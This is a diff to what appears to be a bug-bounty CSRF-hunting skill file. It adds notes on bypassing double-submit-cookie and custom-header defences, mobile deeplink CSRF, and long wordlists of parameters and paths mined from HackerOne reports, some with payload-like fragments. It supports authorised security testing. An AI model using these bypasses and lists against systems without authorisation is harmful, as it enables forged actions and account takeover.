+**Bypass:** If attacker can set cookies (subdomain takeover, cookie injection via HTTP), they can set both the cookie and the form field to matching attacker-controlled values.
+
+
+
+### Defense: Custom request header (e.g., `X-Requested-With`)
+
+**Bypass:** Simple requests (form POST, `text/plain`) don't trigger preflight and can't set custom headers — but some servers only check for header *presence*, not value, and some frameworks accept requests without it.
+
+
+
+---
+
+
+
+### Mobile-app CSRF via custom-scheme deeplink
+
+CSRF is not browser-only. For targets with a mobile app, enumerate exported deeplink / custom-scheme handlers (`scheme://action` from the Android manifest / iOS `Info.plist`) and test whether opening one performs a state-changing action (follow, link, purchase) using the app's ambient session with no CSRF token — deliverable to a victim by a plain link or a QR code. Disclosed: reports/583987, reports/805073.
+
+## Corpus wordlists (mined)
+
+### `params_csrf.txt`
+
+```text
+email
+code
+state
+id
+page
+redirect_uri
+authenticity_token
+client_id
+scope
+nonce
+sort_type
+sort_direction
+limit
+password
+act
+subject
+report_id
+view
+text_query
+response_type
+type
+GO
+action
+name
+token
+oauth_token
+url
+rt
+jsonData
+php_url
+endpoint
+userid
+displayName
+groups[]
+transfer_code
+uuid
+metadata
+url-scan-submit
+al
+message
+oauth_verifier
+substates[]
+resend
+docid
+checkin
+checkout
+merchantId
+merchantIdInPayPal
+permissionsGranted
+accountStatus
+consentStatus
+productIntentID
+productIntentId
+isEmailConfirmed
+csrf
+session
+openid.ns
+openid.mode
+openid.return_to
+openid.claimed_id
+openid.identity
+openid.ns.ax
+openid.ax.mode
+openid.assoc_handle
+openid.response_nonce
+openid.signed
+openid.op_endpoint
+openid.ax.type.email
+openid.ax.type.fullname
+openid.ax.type.nickname
+openid.sig
+ws
+partner_agreement_accepted
+trk
+midToken
+midSig
+trkEmail
+lipi
+utf8
+accountAction
+json
+usp
+invitation_token
+tweet_id
+card_name
+forward
+capi_uri
+text
+user_id
+apply
+next
+bucket
+key
+etag
+return_url
+gid
+evil
+thumb
+time
+ywsid
+device_type
+app_version
+cc
+lang
+efs
+signature
+janrain_nonce
+sentry_version
+sentry_key
+asd
+couponcode
+format
+language
+pageId
+mra
+__EVENTARGUMENT
+__VIEWSTATE
+messageID
+post_type
+tix_summarize
+tix_section
+tix_notify_attendees
+wpe-login
+FirstName
+LastName
+CountryOfResidence
+Nationality
+Birthday
+per_page
+affiliation
+CSRF_TOKEN
+RelayState
+_method
+openid.realm
+openid.ax.value.email
+openid.ax.value.fullname
+openid.ax.value.nickname
+openid.pape.auth_level.nist
+authComplete
+ref
+authuser
+session_state
+prompt
+usingAltSocket
+promo
+term
+fetch
+note
+area
+usecase
+```
+
+### `paths_csrf.txt`
+
+```text
+/login
+/oauth/authorize
+/account/profile/edit
+/wp-admin/admin-ajax.php
+/logout
+/member
+/cgi-bin/cvename.cgi
+/forging-content-type-header-with-flash/
+/bypassing-csrf-protections-fun-profit/
+/search
+/blog/
+/csv_imports/upload_complete
+/manage/personal_key
+/articles/2
+/auth/pinterest/callback
+/_layouts/infa_kb/preview/EmailExtended.aspx
+/pm-delete.jspa
+/user/register
+/admin/payments/complete_paypal_incontext_oauth/41
+/follow
+/auth/cb
+/signup/email
+/app/bugcrowd-iambull-2_gitlabcom_1/exk1lit3jovMjvewh0h8/sso/saml
+/site/oauth2/authorize
+/account/register
+/;path=/;path=/;path=/;path=/;path=/;path=/;path=/
+/path/
+/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=
+/settings
+/google/verify.phtml
+/users/
+/t5/Getting-Started-Product/2-week-old-wisp/m-p/1687239
+/imagefetch.php
+/api/v6/viewer-portal/viewer-settings/donation_settings
+/forgotpassword/
+/secure/CloseAccount.action
+/docs/grafana/latest/administration/configuration/
+/posts/2021-01-29-great-samesite-confusion/
+/api/org/invites
+/internal/app_search/engines/national-parks-demo/curations/find_or_create
+/test.swf
+/mediagallery/index
+/mediagallery/delete/id/
+/crossdomain.xml
+/accounts/login/
+/pl/
+/samesite-cookies-explained/
+/index.cfm
+/account
+/admin/settings/domains/initiate_inter_shop_domain_transfer
+/unlock/
+/al_groups.php
+/chat/user-settings
+/my-account/tickets/
+/pusher/auth
+/moogaloop/crossdomain.xml
+/moogaloop
+/p/flash/moogaloop/6.3.5/moogaloop.swf
+/photo_videos/video/thumbnail/video_id/
+/auth/login/twitter:twitter.com/
+/account/create_secure
+/accounts/complete/ubuntu/
+/accounts/profile/
+/on/demandware.store/Sites-Teavana-Site/default/Home-AddCouponToBasket
+/users
+/~exampleuser/emails/verify.html
+/emails/
+/authenticated
+/edit
+/affiliates/stats
+/xmlrpc.php
+/wp-admin/edit.php
+/products
+/chat/signup
+/pages/settings
+/cdn-cgi/beacon/expect-ct
+/pages/create_project/9k
+/advisories/tiktok-account-takeover/
+/admin/settings/payments
+/oauth2/auth/
+/user/repos
+/programs/github-integration.html
+/oauth2/auth/:authentication_id
+/customers/story/hackerone
+/graphql
+/integrations
+/users/auth/bitbucket/callback
+/2.0/repositories/%7B766210f9-9bec-4010-9f4d-917b06661c0c%7D
+/users/sign_out
+/auth
+/2019/wordpress-csrf-to-rce/
+/u/user/preferences/account
+/auth/yahoo/callback
+/u/testh1ay/preferences/account
+/auth/yahoo/null
+/api/graphql/
+/account/edit/account_id/
+/account/delete-contact/contact_id/
+/v1/oauth/token
+/oauth
+/v1/broadcast/publish
+/pocs/periscope-oauth-csrf/code.php
+/oauth/periscope
+/v1/broadcast/create
+/oauthAuthorize
+/v1/broadcast/delete
+/pocs/periscope-oauth-csrf/
+/proxy-rt/riders/me/pickup
+/Users/GoogleDisable/2023554
+/users/referrals
+/users/usersettingstry
+/Users/GoogleDisable/2026462
+/users/usersettings
+/r/
+/html/rfc2109
+/cpython/file/3.4/Lib/http/cookies.py
+/html/rfc2068
+/3/library/http.cookies.html
+/black2fan
+/web/friendships/1312928755/follow/
+/api/tokens/delete
+/api/tokens/delete/302
+/api/tokens/delete/some_number
+/badoo.html
+/chrome-push-stats
+/pets/delete
+/admin/runners/:runner_id/resume
+/admin/runners/:runner_id/pause
+/account/network
+/v3/subscriptions
+/name=
+/OmerGil/web-cache-deception-attack
+/X-Discourse-Username
+/preferences/email.json
+/x-www-form-urlencoded
+/u/
+/how-it-works/
+/api/sso/v1/user/self
+/tag/hostile-subdomain-takeover/
+/help/verify-domain-ownership-html-or-dns-7452
+/cloudfront/custom-ssl-domains/
+/34902385023958329058235.html
+/signup
+/partners
+/support_interactions/new
+/services/partners/api_clients/new
+/[attacker
+/img-src-x-onerror-prompt2
+/[your_app_id
+/services/shopify_applications/edit
+```
+
 ## Source skills merged into this topic
 
 - `h1skills` — `hackerone-csrf`
 - `hunting` — `csrf`
 - `cbh` — `hunt-csrf`
 
-## References
+## Provenance
 
-- `references/unified-method.md` — complete deduplicated union of all upstream sections
-- `references/upstream-*.md` — full original SKILL.md from each contributing repo
-- `references/upstream-assets/` — 2 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
-- `references/unified-method.md` — includes 2 merged companion methodology documents
-- `references/corpus-wordlists/` — 2 mined paths/params/payload lists from the HackerOne corpus
+- `references/unified-method.md` — same deduplicated union as this file, for tooling
+- `references/upstream-*.md` — unmodified original SKILL.md from each repo
+- `references/upstream-assets/` — 2 companion files
 - `../../upstream/` — complete unmodified archives of all five source repositories
-- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
 - `bbhunt-methodology` — orchestrator, state machine and class router
